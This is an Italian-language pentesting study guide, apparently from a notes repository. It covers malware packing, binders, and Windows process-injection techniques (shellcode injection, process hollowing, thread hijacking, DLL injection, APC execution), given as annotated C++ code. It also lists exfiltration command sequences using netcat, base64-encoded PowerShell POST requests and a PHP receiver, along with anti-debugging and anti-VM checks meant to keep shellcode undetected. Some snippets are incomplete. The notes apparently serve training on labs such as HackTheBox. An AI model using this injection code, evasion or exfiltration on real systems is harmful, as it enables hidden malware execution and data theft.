_Quando si fs il packing di un programma significa trasformarlo tramite una funzione in un packed, il nuovo packed conterrà il codice obfuscato, per poterlo recuperare va fatta l'operazione inversa con il packer utilizzato_

- _Struttura Packing:_

Applicazione----> packer che la impacchetta-----> Applicazione Packed con : entry point e PE header,
									    stub che contiene la funzione unpack(),
	     								    codice packed dell'applicazione
- _Struttura Unpacking:_

Applicazione Packed----> unpacker che legge il codice packed dell'applicazione-----> unpacker che runna il codice originale in RAM

- _Packing nel pratico:_

_In questo esempio utilizziamo il tool [ConfuserEx](https://mkaring.github.io/ConfuserEx/) per fare il packing di un nostro eseguibile_

_Comandi:_
<!-- -->
      Project-> selezioniamo la base directory e sempre sotto clicchiamo il + per aggiungere .exe-> settings tab-> clicchiamo il + e poi selezioniamo la voce 
      packer enable compressor-> torniamo sulla rule facciamo edit e selezioniamo preset maximun-> tab protect e clicchiamo la voce protect 
      #passi per fare il packing di un eseguibile
<!-- -->
- _Software packing:_

_I software per il packing ne esistono molteplici tipo:_

1) [UPX](https://github.com/upx/upx/releases/tag/v4.1.0)

2) [ConfuserEx](https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0)

- _Binders:_

_I Binders è un'altro tipo di programma utilizzato per il bypassing dell'AV, il binding consiste nel legare insieme due eseguibili in un unico_

__N.B: i binders comunque non bypassano completamente l'AV perchè basta una firma nota che vengono bloccati, il loro potenziale consiste nel legare uno shellcode malevolo obfuscato o criptato, con un programma legittimo in modo di fregare un utente normale facendogli credere che sia un programma vero__

##### Tecniche di Injection:

- __Shellcode Injection:__

_Shellcode injection consiste nell'aprire un processo, allocargli della memoria, scrivere il payload nella memoria allocata e tramite un thread remoto eseguirlo_

_Codice:_
<!-- -->
      processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, #campo che definische i diritti del processo
	FALSE, #campo che imposta l'ereditarietà a false
	DWORD(atoi(argv[1]))  #campo che passa il pid del processo tramite input dall'utente
      );
<!-- -->
      remoteBuffer = VirtualAllocEx(
	processHandle, #campo che apre il processo con l'handle
	NULL, #campo che specifica l'indirizzo di partenza con il valore NULL è SO che quindi lo deciderà
	sizeof shellcode, #grandezza da allocare per la memoria
	(MEM_RESERVE | MEM_COMMIT), #campi che prima riservano la memoria e poi la rendono accessibile
	PAGE_EXECUTE_READWRITE #campo che specifica i permessi quali lettura, scritture e esegui
      );
<!-- -->
      WriteProcessMemory(
	processHandle, #campo che passa l'handle
	remoteBuffer, #campo che passa la memoria allocata
	shellcode, #campo che indica lo shellcode da scrivere
	sizeof shellcode, #campo che indica la grandezza
	NULL
      );
<!-- -->
      remoteThread = CreateRemoteThread(
	processHandle, #campo che passa l'handle del processo
	NULL, #campo per i permessi, con il valore NULL li eredita dal processo destinatario
	0, #campo che indica la dimensione dello stack, con il valore 0 sarà SO a fare i calcoli
	(LPTHREAD_START_ROUTINE)remoteBuffer, #campo con puntatore al punto di ingresso della memoria del thread
	NULL, #campo che deve passare dei dati al thread, con il valore NULL non si passa nulla
	0, #campo che fa runnare subito il thread
	NULL
      );
<!-- -->
__N.B: le funzioni VirtualAlloc e VirtualAllocEx sono differenti per una cosa la prima riserva memoria per lo stesso processo mentre la seconda per un processo remoto__

- __Process Hollowing:__

_Il process hollowing molto simile allo shellcode injection solo che questa volta, possiamo fare in modo di injectare un'intero file malevolo, il procedimento consiste: 

1) creare un processo in sospensione
   
2) aprire l'image del file malevolo

3) andare a togliere lo spazio di memoria allocata per il codice legittimo nel nostro processo vittima

4) allocare memoria per il codice malevolo e scrivere ogni sezione nello spazio di memoria

5) preparare il punto d'entrata per il codice malevolo

6) toglire il processo creato dalla sospensione

_Codice:_

_Passo 1_
<!-- -->
	LPSTARTUPINFOA target_si = new STARTUPINFOA(); #variabile che contiene informazioni sulla configurazione del processo
	LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); #variabile che da le informazioni sul processo e thread
	CONTEXT c; #variabile che contiene il contenuto del thread
<!-- -->	
	if (CreateProcessA(
		(LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", #campo che indica il nome dell'eseguibile che verrà avviato
		NULL, #campo che settato a NULL non passa argomenti
		NULL, #campo che settato a NULL non passa argomenti all'ambiente del processo
		NULL, #campo che setta la directory di lavoro sulla directory del processo corrente
		TRUE, #campo che indica che gli handles sono ereditati 
		CREATE_SUSPENDED, #campo che crea il processo in sospensione
		NULL, #campo che settato a NULL non passa nessuna variabile d'ambiente al processo figlio
		NULL, #campo che settato a NULL non specifica il nome
		target_si, #campo che indica il puntatore alla variabile target_s1
		target_pi) == 0) { 
		cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
		return 1;
<!-- -->
_Il passo 2 è diviso in tre step, il primo prendere l'handle dell'eseguibile malevolo, il secondo allocargli della memoria e il terzo è scrivere nello spazio di memoria allocato_

_Step 1:_
<!-- -->
	HANDLE hMaliciousCode = CreateFileA(
		(LPCSTR)"C:\\\\Users\\\\alehelp\\\\malware.exe", #campo che apre un 'eseguibile di nome malware.exe
		GENERIC_READ, #campo che indica la sola lettura
		FILE_SHARE_READ, #campo che indica la condivisibilità del file in sola lettura da altri processi
		NULL, #campo che settato a NULL non indica nessun attributo per il file
		OPEN_EXISTING, #campo che indica che il file debba essere aperto solo se esista
		NULL, #campo che settato a NULL non specifica nessun template per il file 
		NULL #campo che settato a NULL nessun handle di sicurezza è specificato
	);
<!-- -->
 _Step2:_
<!-- -->
	DWORD maliciousFileSize = GetFileSize(
		hMaliciousCode, #campo che passa l'handle del codice malevolo
		0 #campo che non ritorna errori
	);
	
	PVOID pMaliciousImage = VirtualAlloc(
		NULL, #campo che se settato a NULL indica che SO deve scegliere l'indirizzo di base per la memoria virtuale
		maliciousFileSize, #campo che indica le dimensioni dell'eseguibile malevolo
		0x3000, #campo che indica il MEM_RESERVE cioè riservare un tot di memoria e il MEM_COMMIT cioè fare il commit con le pagine fisiche
		0x04 #campo che indica i diritti in questo caso lettura e scrittura
	);
<!-- -->
_Step 3:_
<!-- -->
	DWORD numberOfBytesRead; #variabile che registra i numeri di bytes letti
	
	if (!ReadFile( #la funzione readfile, legge il contenuto dell'eseguibile e lo copia nella memoria allocata
		hMaliciousCode, #campo che indica l'handle dell'eseguibile malevolo
		pMaliciousImage, #campo che indica la memoria allocata
		maliciousFileSize, #campo che indica la dimensione dell'eseguibile malevolo
		&numberOfBytesRead, #campo che indica i numeri di bytes letti
		NULL #campo che settato a NULL non indica altri argomenti
		)) {
		cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
		TerminateProcess(target_pi->hProcess, 0);
		return 1;
	}
	
	CloseHandle(hMaliciousCode); #chiusura dell'handle e vengono liberate le risorse
 <!-- -->
 _Il passo 3 richiede di andare a togliere lo spazio di memoria allocata per il processo, bisogna quindi capire dov'è in memoria e l'entry point, queste due informazioni sono contenute in 2 registri EAX (entry point) e EBX (Process Environment Block) infine dopo averli recuperati possiamo deallocare la memoria_
<!-- -->
	c.ContextFlags = CONTEXT_INTEGER; #variabile che indica quali registri includere nel contenuto del thread, in questo caso quelli di tipo intero
	GetThreadContext(
		target_pi->hThread, #campo che prende l'handle del thread di destinazione
		&c #campo puntatore al contenuto del thread, dopo la chiamata alla funzione avraà il contenuto
	);
	
	PVOID pTargetImageBaseAddress; #puntatore che memorizza l'indirizzo base del processo
	ReadProcessMemory(
		target_pi->hProcess,  #campo che prende l'handle del thread di destinazione
		(PVOID)(c.Ebx + 8), #campo che indica da dove iniziare la lettura della memoria cioè EBX + offset di 8 byte
		&pTargetImageBaseAddress,  #puntatore che memorizza l'indirizzo base del processo
		sizeof(PVOID), #campo che indica i bytes da leggere 
		0 #campo che indica i bytes letti
	);

	HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); #comando che ottiene l'handle della .dll ntdl
	pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress( #funzione che dealloca la memoria
		hNtdllBase, #campo che indica l'handle di ntdl
		"ZwUnmapViewOfSection" #campo che indica API call
	); 
	
	DWORD dwResult = pZwUnmapViewOfSection(
		target_pi->hProcess,  #campo che prende l'handle del thread di destinazione
		pTargetImageBaseAddress #campo che indica l'indirizzo base del processo
	);
<!-- -->
_Il passo 4 richiede di allocare memoria per l'eseguibile malevolo e poi bisogna scrivere nella memoria allocata prima i PE headers e poi le sezioni_
<!-- -->	
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; #codice che inizializza un puntatore di tipo PIMAGE_DOS_HEADER e di valore 
        pMaliciousImage, in modo da recuperare il DOS header dell'eseguibile malevolo
	
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); #codice che inizializza un puntatore di tipo 
        PIMAGE_NT_HEADERS, serve a recuperare l'header NT, viene sommato l'indirizzo dell'eseguibile più e_ifanew che contiene l'offset per l'header
	
	DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; #codice che ottiene la dimensione totale dell'immagine
 
	PVOID pHollowAddress = VirtualAllocEx(
		target_pi->hProcess, #campo che prende l'handle del processo
		pTargetImageBaseAddress, #campo che contiene l'indirizzo base del processo
		sizeOfMaliciousImage, #campo che contiene la dimensione totale dell'eseguibile malevolo
		0x3000, #campo il cui valore 0x3000 corrisponde a MEM_RESERVE e MEM_COMMIT
		0x40 #campo che indica di attivare lettura e scrittura nella memoria virtuale

	if (!WriteProcessMemory(
		target_pi->hProcess, #campo che prende l'handle del processo
		pTargetImageBaseAddress, #campo che contiene l'indirizzo base del processo
		pMaliciousImage, #campo che contiene il puntatore all'eseguibile
		pNTHeaders->OptionalHeader.SizeOfHeaders, #campo che indica la dimensione dei PE headers
		NULL
	)) {
		cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
	}

 	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { #codice che itera per il numero di sezioni
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) 
        + (i * sizeof(IMAGE_SECTION_HEADER))); 
	
	#codice che determina le dimensione della sezione corrente l'operazione consiste: 
    # la somma dell'indirizzo dell'eseguibile malevolo + l'offset dell'NT header per trovare l'indirizzo dell'header NT, 
	# la somma della dimensione dell NT header cosi il puntatore punterà all'inizio del NT header 
    # infine la somma dell'indice per la dimensione del NT header che ci permette di inviduare la sezione corrente

	WriteProcessMemory(
		target_pi->hProcess,  #campo che prende l'handle del processo
		(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), #campo che contiene il l'indirizzo base del processo
		(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), #campo che contiene il puntatore al contenuto della sezione corrente
		pSectionHeader->SizeOfRawData, #campo che indica le dimensioni della sezione corrente
		NULL
	 );
	}
<!-- -->
_Il passo 5 prevede di preparare il punto di entrata per il codice malevolo_
<!-- -->
	c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); 
 	#codice che calcola l'indirizzo virtuale in cui il thread inizia l'esecuzione, i passaggi sono:
        # indirizzo base delle memoria virtuale allocata 
	# sommando poi l'indirizzo di entrata dell'immagine PE
	
	SetThreadContext( #funzione che cambia il contenuto del thread corrente con il contenuto del thread salvato nella struttura c
		target_pi->hThread, #campo che indica l'handle del thread
		&c #campo che punta alla struttura contenente il contenuto
<!-- -->
_Il passo 6 togliamo il processo dallo stato di sospensione_
<!-- -->
	ResumeThread(
		target_pi->hThread #campo che indica l'handle del thread
	);
<!-- -->
- __Thread Hijacking:__

_Nel Thread Hijacking i primi step sono uguali al Shellcode Injection, cioè prendere un processo, allocare memoria e scriverci il codice malevolo al suo interno_

_Codice:_
<!-- -->
      processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, #campo che definische i diritti del processo
	FALSE, #campo che imposta l'ereditarietà a false 
	processId  #campo che registra il PID del processo
      );
<!-- -->
      remoteBuffer = VirtualAllocEx(
	hProcess, #campo che apre il processo con l'handle
	NULL, #campo che specifica l'indirizzo di partenza con il valore NULL è SO che decide
	sizeof shellcode, #grandezza da allocare per la memoria
	(MEM_RESERVE | MEM_COMMIT), #campi che prima riservano la memoria e poi la rendono accesibile
	PAGE_EXECUTE_READWRITE #campo che specifica i permessi quali lettura, scritture e esegui
      );
<!-- -->
      WriteProcessMemory(
	processHandle, #campo che passa l'handle
	remoteBuffer, #campo che passa la memoria allocata
	shellcode, #campo che indica lo shellcode da scrivere
	sizeof shellcode, #campo che indica la grandezza
	NULL
      );
<!-- -->
_Ora va identificato il thread target, andando a cercare il suo threadID_
<!-- -->
	THREADENTRY32 threadEntry; #dichiarazione di una struttura thread, che verrà utilizzata per contenere delle informazioni
	
	HANDLE hSnapshot = CreateToolhelp32Snapshot( #funzione che crea uno snapshot delle informazioni riguardanti i thread o processi nel sistema 
		TH32CS_SNAPTHREAD, #campo che indica di volere fare lo snapshot ai thread
		0 #campo che indica di voler prendere il processo corrente
	);
	Thread32First( #funzione che prende il primo thread dello snapshot
		hSnapshot, #campo che indica l'handle del processo
		&threadEntry #campo puntatore alla struttura thread
	);
	
	while (Thread32Next( #comando che prende il prossimo thread
		snapshot, #campo che indica l'handle del processo
		&threadEntry  #campo puntatore alla struttura thread
	)) {
<!-- -->
_Adesso è necessario aprire il thread, metterlo in sospensione, prendere il suo contenuto e modificare il registro RIP in modo che punti alla regione di memoria contenente il codice malevolo_
<!-- -->
	if (threadEntry.th32OwnerProcessID == processID) #codice ce verifica se l'ID all'interno della stutture thread è uguale all'ID specificato
			{
				HANDLE hThread = OpenThread(
					THREAD_ALL_ACCESS, #campo che indica di volere tutti i diritti sul thread
					FALSE, #campo che settato a FALSE indica che i thread figli non ereditano dal padre
					threadEntry.th32ThreadID #campo che indica l'ID del thread all'interno della struttura
				);
				break;
			}

	SuspendThread(hThread); #funzione per sospendere il thread

	CONTEXT context; #variabile che registra il contenuto
	GetThreadContext(
		hThread, #campo che punta all'handle del thread
		&context #campo puntatore al contenuto della struttura
	);

	context.Rip = (DWORD_PTR)remoteBuffer; #codice che fa puntare il RIP alla zona di memoria del codice malevolo
<!-- -->
_Infine aggiorniamo il contenuto del thread corrente con quello della struttura create e cambiamo da sospeso ad attivo il thread_
<!-- -->
	SetThreadContext(
		hThread, #campo con l'handle del thread a cui copiare il contenuto
		&context #campo puntatore al contenuto della struttura thread
	);
	
	ResumeThread(
		hThread #campo che indica l'handle del thread da riattivare
	);
<!-- -->
- __DLL Injection:__

_Primo passo trovare il processo target_
<!-- -->
		DWORD getProcessId(const char *processName) {
		    HANDLE hSnapshot = CreateToolhelp32Snapshot( #funzione che crea uno snapshot delle informazioni riguardanti i thread o processi nel sistema 
				TH32CS_SNAPTHREAD, #campo che indica di volere fare lo snapshot ai thread
		                0 #campo che indica di voler prendere il processo corrente
				);
		    if (hSnapshot) {
		        PROCESSENTRY32 entry; #campo che definisce la struttura thread di nome entry
		        entry.dwSize = sizeof(PROCESSENTRY32); #campo che ottiene le dimensioni delle struttura
		        if (Process32First( #funzione che prende il thread del primo processo
							hSnapshot, #campo handle dello snapshot
							&entry #campo puntatore alla struttra
						)) {
		            do {
		                if (!strcmp(entry.szExeFile,processName))  { #if di confronto tra i processi per cercare quello target 
		                    return entry.th32ProcessID; #ritorno del process ID cercato se si ha successo
		                }
		            } while (Process32Next(hSnapshot, &entry)); #ciclo while che continua finchè non è stato esaminato tutto lo snapshot
		        }
		    }
		
		DWORD processId = getProcessId(processName); #variabile che ritorna l'ID del processo cercato
<!-- -->
_Continuiamo andano ad aprire il processo target, allocare memoria per la DLL malevola, scriverci ed infine caricarl e eseguirla_
<!-- -->
	HANDLE hProcess = OpenProcess(
		PROCESS_ALL_ACCESS, #campo che indica di volere tutti i diritti
		FALSE, #campo che settato a FALSE non permette l'ereditarietà ai processi figli
		processId #campo che registra il processID target
	);

	LPVOID dllAllocatedMemory = VirtualAllocEx(
		hProcess, #campo handle del processo target
		NULL, 
		strlen(dllLibFullPath), #campo con la grandezza della DLL path
		MEM_RESERVE | MEM_COMMIT, #campo reserve e commit della memoria
		PAGE_EXECUTE_READWRITE #campo che attiva lettura,scrittura e eseguibilità sulle pagine virtuali
	);

	WriteProcessMemory(
		hProcess, #campo handle del processo target
		dllAllocatedMemory, #campo indicante la memoria allocata
		dllLibFullPath, #campo contenente la path alla DLL malevola
		strlen(dllLibFullPath) + 1, #campo contente la grandezza della DLL malevola
		NULL
	);


	LPVOID loadLibrary = (LPVOID) GetProcAddress( #funzione per ottenere un puntatore alla API call da importare
		GetModuleHandle("kernel32.dll"), #campo contenente l'handle della libreria
		"LoadLibraryA" #campo della API call da importare
	);
	HANDLE remoteThreadHandler = CreateRemoteThread(
		hProcess, #campo che indica l'handle del processo target
		NULL, #campo che indica le impostazioni predefinite per la dimensione dello stack
		0, #campo che indica la dimensione predefinita dello stack
		(LPTHREAD_START_ROUTINE) loadLibrary #campo puntatore alla funzione importata
		dllAllocatedMemory, #campo puntatore alla memoria allocata
		0, #campo che indica l'esecuzione immediata
		NULL #campo che settato a NULL non specifica parametri di sicurezza
	);
<!-- -->
- __Esecuzione alternative in memoria:__

1) _Puntatori di Funzione:_

_I puntatori di funzione permettno l'esecuzione solo a memoria allocata localmente e non fanno affidamento su nessuna API call_

_Esempio e spiegazione:_
<!-- -->
      (void(*)() #codice che crea un puntatore di funzione
<!-- -->
      (/puntatore a funzione/)addressPointer) #codice che casta addressPointer che può essere un puntatore di memoria o un array shellcode a puntatore di 
      funzione
<!-- -->      
      (); #codice che invoca la funzione per eseguire lo shellcode
<!-- -->
      ((void(*)())addressPointer)(); #codice completo
<!-- -->
2) _Chiamate a procedure asincrone:_

_Le ckhiamate a procedure asincrone sono funzioni che si eseguono in maniera non sincrona nei thread_

_Codice:_
<!-- -->
	QueueUserAPC( #funzione che inserisce un procedura asincrona nella coda di un thread specifico
		(PAPCFUNC)addressPointer, #campo puntatore alla procedura asincrona
		pinfo.hThread, #campo handle del thread
		(ULONG_PTR)NULL #campo NULL
		);
  
	ResumeThread( #funzione che riattiva un thread in sospeso
		pinfo.hThread #campo handle del thread
	);
 
	WaitForSingleObject( #funzione che fa attendere il thread
		pinfo.hThread, #campo handle del thread
		INFINITE #campo che indica l'attesa in questo caso INFINITE indica di attendere fino a che il thread non termina 
	);
<!-- -->
##### Tecniche di esfiltrazione:

_Nello shellcode ma anche più generale i malware esfiltrano dati, in fase di pentesting può essere utile esfiltrare dati perchè possano essere visionati in un secondo momento._

- __TCP Socket:__

_Il più generico metodo d'esfiltrazione è tramite un socket TCP, la nostra machine sarà in ascolto per i dati in arrivo mentre dalla target machine eseguiamo i comandi per prendere i dati_

- _Comandi:_
<!-- -->
      nc -lvp <porta> > <path dove salvare i dati ricevuti> #comando per aprire il listener e poi salvare i dati
<!-- -->
      Compress-Archive -Path "<path file da zippare>" -DestinationPath "<path file dove salvarlo>" #comando per zippare il file da inviare
<!-- -->      
      $base64Data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("<path file zip>")) #comando per encodare i bytes in base64
<!-- -->      
      Invoke-WebRequest -Uri "<url target machine>" -Method POST -Body $base64Data #comando per inviare i dati alla nostra target machine
<!-- -->
- __SSH:__

_Tramite una connessione SSH è possibile esfiltrare i dati, ed essendo tramite SSH la connessione sarà criptata_

- _Comandi:_
<!-- -->
      Import-Module SSH-Sessions #comnado che importa il modulo SSH se non presente
<!-- -->     
      $sshInfo = @{ #comando che una hashtable con le informazioni per loggare con SSH
       ComputerName = "<indirizzo ip>" 
       Port = <porta>
       Credential = Get-Credential #comando che registra le credenziali se presenti per l'accesso  
      }
<!-- -->
      $session = New-SSHSession @sshInfo #comando che stabilisce la connessione
<!-- -->
      Invoke-SSHCommand -SSHSession $session -Command "<comando alla target machine>" #comando che invia tramite SSH un comando
<!-- -->
ES: `Invoke-SSHCommand -SSHSession $session -Command "<nc -lvp 8080 > /tmp/file1.data>"`
<!-- -->      
      Compress-Archive -Path "<path file da zippare>" -DestinationPath "<path file dove salvarlo>" Optimal #comando per zippare il file da inviare
<!-- -->
      $base64Data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("<path file zip>")) #comando per encodare i bytes in base64
<!-- -->      
      Invoke-WebRequest -Uri "<url target machine>" -Method POST -Body $base64Data #comando per inviare i dati alla nostra target machine
<!-- -->
      Remove-SSHSession -SSHSession $session #comando per chiudere la sessione SSH
<!-- -->
- __HTTP POST:__

_L'esfiltrazione tramite HTTP POST può giocare a nostro vantaggio in quanto è più difficile da rilevare perchè va filtrato con il traffico HTTP legittimo_

- _Comandi:_

_Nella nostra target machine abbiamo bisogno di un piccolo form in PHP che gestisca i dati inviati_
<!-- -->
      <?php 
        if (isset($_POST['file'])) {
         $file = fopen("<path dove salvare>","w");
         fwrite($file, $_POST['file']);
         fclose($file);
        }
      ?> #script in PHP che ha il compito di gestire i file in arrivo e scrivere il contenuto dei dati esfiltrati nella nostra machine
<!-- -->
      Compress-Archive -Path "<path file da zippare>" -DestinationPath "<path file dove salvarlo>" Optimal #comando per zippare il file da inviare
<!-- -->  
      $base64Data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("<path file zip>")) #comando per encodare i bytes in base64
<!-- -->      
      Invoke-WebRequest -Uri "<url target machine>" -Method POST -Body $base64Data #comando per inviare i dati alla nostra target machine, specificare il nome dello script php      
<!-- -->  
##### Decompiling e Debugging:

_Il Decompiling consiste nel decompilare il codice di un .exe o di un programma, cercando di andare a capire il funzionamento interno di esso mentre il Debugging decompila sempre il codice e permette di interagire (cambiare valori ai registri, breakpoint, ecc...) con il codice stesso per vedere come reagisce_

_esistono 3 tipologie di debugger:_ 

- Debugger ad alto livello = debugger per i linguaggi ad alto livello che controllano l'esecuzione del codice e l'eventuale presenza di bug

- Debugger Assembly = debugger che recupera l'assembly di un eseguibile, dove possiamo visionare valori di memoria e dei registri

- Debugger Kernel = debugger al più basso livello possibile quello del kernel

- __Anti-Detection dello shellcode:__

_Le tecniche Anti-Detection sono utili per coprire il nostro shellcode, in modo che passi inosservato_

_Tecniche di Anti-Debugging:_

1) Controllare la presenza di un debugger = tramite la funzione __"IsDebuggerPresent"__ che controlla se un debugger è presente

2) Modifica dei registri di debug = tramite la modifica o corruzione dei logs di debug, utilizzati dal debugger per il controllo del codice

3) Codice che si automodifica = cioè codice che mentre avviato si modifica per rendere più difficile il lavoro del debugger

_Tecniche di Anti-VM:_

1) Controllo dei processi = VMWare runna un processo chiamato __"vmtools"__ mentre VirtualBox __"vboxservice"__ per vederli viene utilizzata la funzione __"EnumProces"__

2) Controllo dei software installati = alla seguente key __"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"__, possiamo verificare le presenza di debugger, decompilatori e ecc...

3) Controllo di Rete = le VM comunicando con la rete generano un loro __"MAC address"__ con i seguenti valori __"00-05-69, 00-0c-29, 00-1c-14 o 00-50-56"__ che riconoscono i vendor

4) Risorce computer = il controllo delle risorse dei computer, in quanto per una VM non viene assegnata molta RAM

5) Controllo delle periferiche = controllo delle periferiche esempio in ricerca di stampanti, una VM di solito non le monta

6) Controllo Dominio = tramite le variabili d'ambiente __"LoggonServer"__ e __"ComputerName"__, possiamo controllare se siamo sotto AD

7) Attacchi a tempo = controllo del tempo per eseguire un'istruzione in quanto in una macchina fisica è più veloce rispetto in una macchina virtuale

8) Sensore temperatura = tramite il controllo della voce __"Win32_TemperatureProbe"__ settato a __"Not Supported"__ significa che non vi è il sensore della temperatura e che quindi siamo in una VM però anche macchine fisiche possono non averlo quindi va preso con le pinze 

_Tool VM:_

_Esistono 2 script che aiutano il blue teaming a nascondere la presenza della loro VM:_

1) [VMware Cloak](https://github.com/d4rksystem/VMwareCloak)

2) [VBoxCloak](https://github.com/d4rksystem/VBoxCloak)

- __Tool Debugging:__

_Esistono molti programmi con la funzione di debugger tra cui:_

1) [Ghidra](https://github.com/NationalSecurityAgency/ghidra/releases)

2) [gdb](https://www.sourceware.org/gdb/download/)

3) [radare2](https://rada.re/r/down.html)

__N.B: Il nostro parere è di sceglierlo in base alla comodità e usabilitò__

### Note sulla sicurezza in Windows

_SID(Security Identifier) aggiunto a utente,gruppi,domini o a qualsiasi altro entità di sicurezza, viene utilizzato per gestire l'accesso alle risorse_

ES:
_S-1-5-21-674899381-4069889467-2080702030-1002_

_SAM(Security account manager) database interno che contiene le informazioni dei vari utenti come password, hash e nomi utenti, è utilizzato dal LSA(lsass.exe) per l'autenticazione._

_ACL(Access control list) e ACE (Access control entrie) le ACE le troviamo dentro l'ACL, le ACE possono avere diverse regole come: deny o allow e si applicano su risorse e utenti._

_Local group policy utilizzato per le policy di sicurezza dei gruppi._

_MMC(Microsoft management console) interfaccia gui che permette di aggiungere degli snaps-in(moduli) che estendono le funzionalitè del MMC che ha il compito di monitorare risorse hardware e software._

_WMI è un sottosistema di powershell, che fornisce informazioni dettagliate sul sistema operativo, l'hardware, il software e altre risorse del computer per il system monitoring, fa da framework comune perchè presente sulle varie versioni di Windows_

# Credits:

_Molte informazioni inerenti a questa repo non sono state prese dal nulla, ma sono l'insieme di varie macchine, room e moduli teorici svolti nei seguenti siti:_

- [HackTheBox-Academy](https://academy.hackthebox.com/)

- [TryHackMe](https://tryhackme.com/)

_Inoltre vorrei ringrazire il mio amico [Disturbante](https://github.com/Disturbante) per il suo contributo alla sezioni di:_

- [Comandi info generali pc](./#comandi-info-generali-pc)

- [Comandi per i file](./#comandi-per-i-file)

- [Comandi ADS](./#comandi-ads-alternate-data-stream)

- Alcune sezioni di [Privilege Escalation](./#privilege-escalation)

- [Powerview](./#Powerview)

- [Bloodhund](./#bloodhund)
